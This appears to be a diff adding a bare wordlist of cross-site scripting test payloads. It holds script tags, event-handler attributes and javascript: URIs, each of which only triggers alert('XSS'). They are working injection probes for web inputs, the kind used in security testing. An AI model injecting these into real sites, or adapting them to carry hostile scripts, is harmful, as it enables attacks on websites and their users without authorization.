@@ -1,0 +1,24 @@
+# XSS Payloads - Cross-Site Scripting
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert('XSS')>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src="javascript:alert('XSS')">
+<iframe src="javascript:alert('XSS')">
+<body onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<select onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<video><source onerror="javascript:alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<form action="javascript:alert('XSS')"><input type=submit>
+<input onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<button onfocus=alert('XSS') autofocus>
